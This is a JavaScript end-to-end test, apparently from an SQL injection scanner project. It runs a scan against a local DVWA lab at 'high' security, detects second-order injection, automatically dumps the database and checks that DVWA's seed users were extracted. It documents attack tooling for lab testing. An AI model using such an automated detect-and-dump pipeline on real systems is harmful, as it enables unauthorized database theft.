// ============================================================================
// e2e/dvwa-lab/high-fullchain.mjs —— [D301] DVWA sqli high 完整管线闭环（真机）
//
// 此前 all-levels 里 sqli high 是分两步验证的：① 检测扫描（diffJudge 命中 second_order）；
// ② 直驱适配器拖库（手工构造存储点）。本用例补最后一环：**同一次扫描**里
// enableExtract=true，检测命中挂 _d300 → extractPhaseD300 自动二阶拖库 → report.data
// 落种子数据——即「检测命中 → 自动拖库」管线在 DVWA high（MySQL 触发页）真机闭环。
//
// 判据（诚实口径）：
//   1. second_order 命中（diffJudge 路径）
//   2. report.data 拖出 dvwa.users 种子用户（admin/gordonb/1337/pablo/smithy ≥4/5）
//   3. summary.d300Channels 含 extended-extract（通道标记）
// 复跑：node scripts/labs.mjs --up=dvwa,mariadb && node e2e/dvwa-lab/high-fullchain.mjs
// ============================================================================
import { mkdirSync, writeFileSync } from 'node:fs';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { ScanManager } from '../../server/src/engine/ScanManager.js';

const HERE = dirname(fileURLToPath(import.meta.url));
const RESULTS_DIR = resolve(HERE, 'results');
const BASE = process.env.DVWA_BASE || 'http://127.0.0.1:8099';
const SESSION = process.env.DVWA_PHPSESSID || 'dvwa-lab-session';
const SEED_USERS = ['admin', 'gordonb', '1337', 'pablo', 'smithy'];
const TIMEOUT_MS = Number(process.env.HIGH_FC_TIMEOUT_MS) || 600_000;

async function reachable() {
  try {
    const r = await fetch(`${BASE}/login.php`, { signal: AbortSignal.timeout(8000) });
    const t = await r.text();
    return r.ok && (t.includes('Damn Vulnerable Web Application') || t.includes('DVWA'));
  } catch { return false; }
}

if (!(await reachable())) {
  console.log(`[SKIP] DVWA 不可达（${BASE}）—— 先 node scripts/labs.mjs --up=dvwa,mariadb`);
  process.exit(0);
}
console.log(`[high-fc] DVWA 就绪：${BASE}`);

const sm = new ScanManager({});
const scanId = await sm.start({
  url: `${BASE}/vulnerabilities/sqli/session-input.php`,
  cookieParams: { security: 'high', PHPSESSID: SESSION },
  config: {
    concurrency: 1, ratePerSec: 0, retry: 0, timeoutMs: 20000, productionMode: false,
    level: 2, risk: 2,
    crawlForms: true,            // 存储点发现的第一层真因（缺它 storePoints=[] 检测器零执行）
    confirmFormWrites: true,     // 二阶存储 = 真实写请求，须显式确认
    enableExtract: true,         // 本用例的核心：检测命中后自动进入扩展拖库
    dbms: 'MySQL',               // 无回显指纹推不出方言
    unionCols: '2',              // 触发页 SELECT first_name, last_name（2 列）
    techniques: ['error', 'boolean'],
    secondOrder: { enabled: true, triggerUrls: [`${BASE}/vulnerabilities/sqli/`], negativeControl: true, diffJudge: true },
  },
});
const t0 = Date.now();
let status = 'running';
for (;;) {
  const s = sm.scans.get(scanId);
  if (s && (s.status === 'completed' || s.status === 'error')) { status = s.status; break; }
  if (Date.now() - t0 > TIMEOUT_MS) { sm.stop(scanId); status = 'timeout'; break; }
  await new Promise((r) => setTimeout(r, 200));
}
const report = sm.getReport(scanId) || {};
const data = report.data || {};
const soHit = (report.vulns || []).some((v) => v.technique === 'second_order');
const channels = report.summary?.d300Channels || [];
const rowText = JSON.stringify(data.rows || {});
const hits = SEED_USERS.filter((u) => rowText.includes(u));
const rowTables = Object.entries(data.rows || {}).filter(([, r]) => Array.isArray(r) && r.length > 0).map(([k, r]) => `${k}(${r.length}行)`);
const unconfirmed = data.meta?.dumpUnconfirmed || [];

const checks = { soHit, dumpSeeded: hits.length >= 4, channelMarked: channels.includes('extended-extract'), noUnconfirmed: unconfirmed.length === 0 };
const pass = status === 'completed' && Object.values(checks).every(Boolean);

console.log(`[${pass ? 'PASS' : 'FAIL'}] status=${status} 耗时=${((Date.now() - t0) / 1000).toFixed(1)}s 请求=${report.summary?.validity?.counts?.total ?? 0}`);
console.log(`  second_order 命中=${soHit}  检出=[${(report.vulns || []).map((v) => v.technique).join(',') || '-'}]`);
console.log(`  库=${JSON.stringify(data.databases || [])}`);
console.log(`  有行表=${JSON.stringify(rowTables)}`);
console.log(`  种子对账=${hits.length}/5（${hits.join('、') || '未命中'}）  通道=${JSON.stringify(channels)}  dumpUnconfirmed=${JSON.stringify(unconfirmed)}`);

mkdirSync(RESULTS_DIR, { recursive: true });
const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
writeFileSync(resolve(RESULTS_DIR, `high-fullchain-${stamp}.json`), JSON.stringify({ base: BASE, at: new Date().toISOString(), pass, checks, status, dbs: data.databases || [], rowTables, seedHits: hits, channels, unconfirmed, requests: report.summary?.validity?.counts?.total ?? 0 }, null, 2));
console.log(`\n[high-fc] 结果落盘 results/high-fullchain-${stamp}.json`);
console.log(pass ? '✅ DVWA sqli high 完整管线闭环（检测命中 → 自动二阶拖库 → 报告数据）' : '❌ 完整管线未闭环（见上）');
process.exit(pass ? 0 : 1);
